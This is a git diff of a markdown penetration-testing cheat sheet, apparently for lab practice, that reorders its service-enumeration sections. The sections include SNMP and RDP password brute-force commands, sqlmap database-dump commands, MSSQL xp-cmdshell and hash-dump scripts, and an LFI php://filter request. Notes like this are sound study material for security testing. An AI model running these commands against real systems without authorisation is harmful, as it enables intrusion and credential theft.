@@ -210,11 +210,26 @@ Nmap DNS scripts: `nmap -sTU -p53 $IP --script "dns*"`
 
 Enumerate user using Finger: `finger -sl username@$IP`
 
+### POP3 TCP/110:
+
+Telnet to SMTP server: `telnet {ip} {port}`\
+Commands: user, pass, list, retr
+
 ### Netbios TCP/135/138/139:
 
 Netbios Windows User enumeration (SensePost-UserEnum_NBS): `UserEnum_NBS.py 10.10.16.202 10.10.10.4 Contoso userslist.txt`\
 RPC Windows User enumeration (SensePost-UserEnum_NBS):`UserEnum_RPC.py 10.10.10.4 userslist.txt`\
 Impacket RPCDump: `rpcdump.py $IP`
+
+### SNMP TCP/161:
+
+Fix output values: `apt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf`\
+Enumerate with SNMP Check Public v2c: `snmp-check $ip -p161 -c public -v 2c`\
+Enumerate with SNMP Check default: `snmp-check $ip`\
+Enuerate with Snmpenum: `snmpenum $ip public windows.txt`\
+Nmap SNMP scripts: `nmap -sU $ip -p161 -Pn --script "snmp*" `\
+Brute force with OneSixtyOne:`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip`\
+SNMP Creds: `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
 
 ### Micrsoft RPC/Endpoint mapper:
 
@@ -247,6 +262,25 @@ LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64
 PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
 LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`
 
+### SQL TCP/1433:
+
+NMAP Enumeration: `nmap 10.10.10.59 -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER`\
+SQLMap Enumeration: `sqlmap -R`\
+SqlNinja\
+MSDat - Micrsoft Database Attacking Tool: `https://github.com/quentinhardy/msdat`
+
+### Oracle
+odat standaline tool: `https://github.com/quentinhardy/odat/releases/download/2.2.1/odat-linux-libc2.5-i686.tar.gz`
+
+### MySQL/3306:
+Fingerpring (-f) SQL with SQLMap: `sqlmap -r request.txt -f`\
+Dump databases (--dbs) SQL with SQLMap: `sqlmap -r request.txt -D mysql --dbs --dump`\
+Dump tables in DB (--db test --tables) SQL with SQLMap: `sqlmap -r request.txt -D mysql --D test --tables --dump`
+
+### RDP/3389
+Enumeration: `nmap -A --script=vuln -p3389 --script="rdp*" -v`
+Bruteforce: `ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP`
+
 ### Check file extensions:
 
 ASP Classic: `asp`\
@@ -271,8 +305,8 @@ Random: `txt, bak, un~`
 ### Check http response codes: 200,204,301,302,307,403
 
 #### HTTP directory enumeration:
-GoBuster Directory enumeration: `gobuster -u $IP -w $wordlist -e -s '200,204,301,302,307,403,500`\
-GoBuster Directory Appened forward-slash enumeration: `gobuster -u $IP -w wordlist.txt -l -e -s '200,204,301,302,307,403,500 -t 30`\
+GoBuster Directory enumeration: `gobuster -u $IP -w $wordlist -e -s 200,204,301,302,307,403,500`\
+GoBuster Directory Appened forward-slash enumeration: `gobuster -u $IP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
 GoBuster File ext (-x) enumeration: `gobuster -u $IP -x PHP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
 GoBuster options: `-t add slashes, -l length, -e extended URL, -s codes, -t threads`\
 Dirb through a proxy: `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`
@@ -321,44 +355,6 @@ Wordpress scan: `WPScan -u http://10.10.10.59 --enumerate -u,t,at,ap --proxy 127
 GiTtools: `https://github.com/internetwache/GitTools`\
 Dump git site: `./gitdumper.sh http://10.10.10.178/.git/ .git`\
 Extract: `./extractor.sh ../../.git ../../git-dest-dir`
-
-### POP3 TCP/110:
-
-Telnet to SMTP server: `telnet {ip} {port}`\
-Commands: user, pass, list, retr
-
-### SNMP TCP/161:
-
-Fix output values: `apt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf`\
-Enumerate with SNMP Check Public v2c: `snmp-check $ip -p161 -c public -v 2c`\
-Enumerate with SNMP Check default: `snmp-check $ip`\
-Enuerate with Snmpenum: `snmpenum $ip public windows.txt`\
-Nmap SNMP scripts: `nmap -sU $ip -p161 -Pn --script "snmp*" `\
-Brute force with OneSixtyOne:`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip`\
-SNMP Creds: `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
-
-### SQL TCP/1433:
-
-NMAP Enumeration: `nmap 10.10.10.59 -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER`\
-SQLMap Enumeration: `sqlmap -R`\
-SqlNinja\
-MSDat - Micrsoft Database Attacking Tool: `https://github.com/quentinhardy/msdat`
-
-### Oracle
-odat standaline tool: `https://github.com/quentinhardy/odat/releases/download/2.2.1/odat-linux-libc2.5-i686.tar.gz`
-
-### MySQL/3306:
-Fingerpring (-f) SQL with SQLMap: `sqlmap -r request.txt -f`\
-Dump databases (--dbs) SQL with SQLMap: `sqlmap -r request.txt -D mysql --dbs --dump`\
-Dump tables in DB (--db test --tables) SQL with SQLMap: `sqlmap -r request.txt -D mysql --D test --tables --dump`
-
-### RDP/3389
-Enumeration: `nmap -A --script=vuln -p3389 --script="rdp*" -v`
-Bruteforce: `ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP`
-
-## File xfers
-
-### Linux servers
 
 #### Python FTP:
 
